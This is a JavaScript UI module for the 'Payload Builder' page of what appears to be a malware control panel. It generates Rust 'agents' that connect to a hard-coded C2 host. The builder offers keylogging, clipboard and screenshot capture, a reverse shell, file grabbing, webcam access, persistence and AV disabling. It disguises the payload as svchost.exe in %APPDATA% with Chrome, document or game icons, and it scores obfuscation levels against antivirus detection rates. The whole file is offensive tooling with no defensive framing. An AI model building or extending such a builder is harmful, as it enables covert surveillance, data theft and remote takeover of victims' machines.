import { api } from "./api.js";
import { toast } from "./toast.js";
const state = {
    host: "windowssys.hidenmc.com",
    port: 443,
    format: "exe",
    obfuscation: "medium",
    icon: "chrome",
    mutex: "HC-" + Math.random().toString(36).slice(2, 10).toUpperCase(),
    installPath: "%APPDATA%\\Microsoft\\svchost.exe",
    features: {
        keylogger: true,
        clipboard: true,
        screenshot: true,
        persistence: true,
        hideWindow: true,
        antiVM: false,
        disableAV: false,
        reverseShell: true,
        webcam: false,
        fileGrabber: true,
    },
};
const ICONS = {
    chrome: "🌐",
    document: "📄",
    installer: "⚙️",
    media: "🎵",
    game: "🎮",
    image: "🖼️",
};
export function renderBuilder() {
    return `
    <h1>Payload Builder</h1>
    <p class="page-sub">Generate a Rust-based HidenCloud agent (.exe). The agent connects to <code>windowssys.hidenmc.com/&lt;your-userid&gt;</code> automatically.</p>

    <div class="builder-layout">
      <div class="card builder-cfg">
        <div class="builder-section">
          <h3>🌐 Connection</h3>
          <label>C2 Host</label>
          <input id="b-host" value="${state.host}" readonly style="opacity:0.6;cursor:not-allowed" />
          <p class="muted" style="margin:4px 0 8px;font-size:12px">Auto-set to windowssys.hidenmc.com — agents route to your user ID.</p>
          <label>Port</label>
          <input id="b-port" type="number" min="1" max="65535" value="${state.port}" />
        </div>

        <div class="builder-section">
          <h3>📦 Output</h3>
          <label>Format</label>
          <div class="chip-row" id="b-format">
            ${["exe"].map((f) => `<button class="chip active" data-val="${f}">${f.toUpperCase()} (Rust)</button>`).join("")}
          </div>
          <label>Icon</label>
          <div class="icon-row" id="b-icon">
            ${Object.keys(ICONS).map((k) => `<button class="icon-tile ${k === state.icon ? "active" : ""}" data-val="${k}"><span>${ICONS[k]}</span><em>${k}</em></button>`).join("")}
          </div>
        </div>

        <div class="builder-section">
          <h3>🛡️ Evasion</h3>
          <label>Obfuscation</label>
          <div class="chip-row" id="b-obf">
            ${["none", "light", "medium", "heavy", "polymorphic"].map((o) => `<button class="chip ${o === state.obfuscation ? "active" : ""}" data-val="${o}">${o}</button>`).join("")}
          </div>
          <label>Mutex</label>
          <input id="b-mutex" value="${state.mutex}" />
          <label>Install Path</label>
          <input id="b-install" value="${state.installPath}" />
        </div>

        <div class="builder-section">
          <h3>✨ Features</h3>
          <div class="feature-grid" id="b-features">
            ${Object.keys(state.features).map((k) => `
              <label class="feature-toggle">
                <input type="checkbox" data-feat="${k}" ${state.features[k] ? "checked" : ""} />
                <span class="feature-name">${featureLabel(k)}</span>
              </label>`).join("")}
          </div>
        </div>
      </div>

      <div class="card builder-preview">
        <div class="preview-header">
          <div class="preview-icon" id="preview-icon">${ICONS[state.icon]}</div>
          <div>
            <div class="preview-title" id="preview-title">hidencloud-agent.exe</div>
            <div class="muted" id="preview-target">windowssys.hidenmc.com/&lt;your-uid&gt;</div>
          </div>
        </div>

        <div class="preview-stats">
          <div><span class="muted">Language</span><strong>Rust</strong></div>
          <div><span class="muted">Est. size</span><strong id="preview-size">—</strong></div>
          <div><span class="muted">Detection</span><strong id="preview-detection">—</strong></div>
          <div><span class="muted">Startup</span><strong id="preview-startup">—</strong></div>
        </div>

        <h4 class="preview-h">Enabled modules</h4>
        <div class="preview-features" id="preview-features"></div>

        <div class="build-log" id="build-log">
          <div class="muted">Ready. Press Build to generate the Rust agent source.</div>
        </div>

        <button class="primary build-btn" id="b-build">🔨 Build Rust Agent</button>
      </div>
    </div>
  `;
}
function featureLabel(k) {
    return k.replace(/([A-Z])/g, " $1").replace(/^./, (s) => s.toUpperCase());
}
function estimateSize() {
    const base = 128;
    const featCost = Object.values(state.features).filter(Boolean).length * 22;
    const obf = { none: 0, light: 40, medium: 90, heavy: 160, polymorphic: 260 }[state.obfuscation] ?? 0;
    return base + featCost + obf;
}
function detectionScore() {
    const heavy = state.obfuscation === "heavy" || state.obfuscation === "polymorphic";
    const av = state.features.disableAV;
    const anti = state.features.antiVM;
    let pct = 62;
    if (heavy)
        pct -= 25;
    if (av)
        pct -= 15;
    if (anti)
        pct -= 8;
    pct = Math.max(3, Math.min(pct, 95));
    const tone = pct < 20 ? "ok" : pct < 55 ? "idle" : "warn";
    return { pct, label: `${pct}/72 vendors`, tone };
}
export function bindBuilder(root) {
    const $ = (sel) => root.querySelector(sel);
    function update() {
        $("#preview-icon").textContent = ICONS[state.icon] ?? "📦";
        $("#preview-title").textContent = `hidencloud-agent.exe`;
        $("#preview-target").textContent = `windowssys.hidenmc.com/<your-uid>`;
        $("#preview-size").textContent = `${estimateSize()} KB`;
        const det = detectionScore();
        const detEl = $("#preview-detection");
        detEl.textContent = det.label;
        detEl.className = `delta ${det.tone}`;
        $("#preview-startup").textContent = state.features.persistence ? "Auto-start" : "Manual";
        $("#preview-features").innerHTML = Object.entries(state.features)
            .filter(([, v]) => v)
            .map(([k]) => `<span class="feat-chip">✓ ${featureLabel(k)}</span>`)
            .join("") || `<span class="muted">No modules enabled</span>`;
    }
    root.querySelectorAll("#b-obf .chip").forEach((c) => c.addEventListener("click", () => {
        state.obfuscation = c.dataset["val"];
        root.querySelectorAll("#b-obf .chip").forEach((x) => x.classList.remove("active"));
        c.classList.add("active");
        update();
    }));
    root.querySelectorAll("#b-icon .icon-tile").forEach((c) => c.addEventListener("click", () => {
        state.icon = c.dataset["val"];
        root.querySelectorAll("#b-icon .icon-tile").forEach((x) => x.classList.remove("active"));
        c.classList.add("active");
        update();
    }));
    root.querySelectorAll("#b-features input").forEach((cb) => cb.addEventListener("change", () => {
        state.features[cb.dataset["feat"]] = cb.checked;
        update();
    }));
    $("#b-port").addEventListener("input", (e) => { state.port = Number(e.target.value) || 0; update(); });
    $("#b-mutex").addEventListener("input", (e) => { state.mutex = e.target.value; });
    $("#b-install").addEventListener("input", (e) => { state.installPath = e.target.value; });
    const log = $("#build-log");
    const buildBtn = $("#b-build");
    buildBtn.addEventListener("click", async () => {
        buildBtn.disabled = true;
        buildBtn.textContent = "Building…";
        log.innerHTML = "";
        const steps = [
            "Resolving Rust dependencies…",
            "Generating agent source (main.rs)…",
            "Generating Cargo.toml…",
            `Injecting ${Object.values(state.features).filter(Boolean).length} feature modules…`,
            `Applying ${state.obfuscation} obfuscation layer…`,
            "Embedding C2 URL with user ID…",
            "Packaging…",
        ];
        for (const s of steps) {
            await new Promise((r) => setTimeout(r, 380));
            const line = document.createElement("div");
            line.className = "build-line";
            line.textContent = "▸ " + s;
            log.appendChild(line);
            log.scrollTop = log.scrollHeight;
        }
        try {
            const res = await api.build(state);
            // success line
            const done = document.createElement("div");
            done.className = "build-line ok";
            done.textContent = `✓ Agent generated — ${res.c2Url} (uid: ${res.userId})`;
            log.appendChild(done);
            // Download main.rs
            const blob = new Blob([res.contents], { type: "text/plain" });
            const url = URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = res.filename;
            a.textContent = `⬇️ Download ${res.filename}`;
            a.className = "download-link";
            log.appendChild(a);
            // Download Cargo.toml
            if (res.cargoContents) {
                const cargoBlob = new Blob([res.cargoContents], { type: "text/plain" });
                const cargoUrl = URL.createObjectURL(cargoBlob);
                const ca = document.createElement("a");
                ca.href = cargoUrl;
                ca.download = "Cargo.toml";
                ca.textContent = `⬇️ Download Cargo.toml`;
                ca.className = "download-link";
                log.appendChild(ca);
            }
            // Show C2 info
            const info = document.createElement("div");
            info.className = "build-line";
            info.innerHTML = `<span class="muted">C2 endpoint:</span> <strong>${res.c2Url}</strong>`;
            log.appendChild(info);
            toast("Rust agent generated successfully", "success");
        }
        catch (err) {
            const line = document.createElement("div");
            line.className = "build-line err";
            line.textContent = "✗ " + (err instanceof Error ? err.message : "Build failed");
            log.appendChild(line);
            toast("Build failed", "warn");
        }
        finally {
            buildBtn.disabled = false;
            buildBtn.textContent = "🔨 Build Rust Agent";
        }
    });
    update();
}
